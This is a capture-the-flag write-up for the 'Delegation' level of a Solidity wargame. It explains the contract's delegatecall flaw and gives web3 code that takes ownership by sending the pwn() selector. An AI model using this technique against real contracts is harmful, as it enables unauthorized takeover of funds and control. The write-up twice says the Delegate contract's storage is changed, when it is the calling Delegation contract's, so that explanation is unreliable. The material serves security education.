# Delegation

# Problem Statement

```
The goal of this level is for you to claim ownership of the instance you are given.

Things that might help
- Look into Solidity's documentation on the delegatecall low level function, how it works, 
how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids
```

# Solution
In the target contract, `Delegation`, notice the `delegatecall(msg.data)` in the `fallback` function:
```
fallback() external {
  (bool result,) = address(delegate).delegatecall(msg.data);
  if (result) {
    this;
  }
}
```
Also notice the `Delegate` contract function `pwn` sets the `owner`:
```
function pwn() public {
  owner = msg.sender;
}
```
Also note that if `pwn()` is called using `delegatecall` then it will modify the storage of
the calling contract which in this case is the `Delegate` contract.
With these pieces of information, we can make a call to the `Delegation` `fallback` function and with a data of `pwn()` which will change the `Delegate` contract's `owner` value:
```
await contract.owner() // check the owner
let sig = web3.eth.abi.encodeFunctionSignature("pwn()")
await web3.eth.sendTransaction({
  to: contract.address,
  from: player,
  data: sig
})
await contract.owner() // your EOA should be the owner now
```
We've completed this lesson!

# Key Learnings
- Be careful when using `delegatecall` and especially with `msg.data` as it's input parameter.
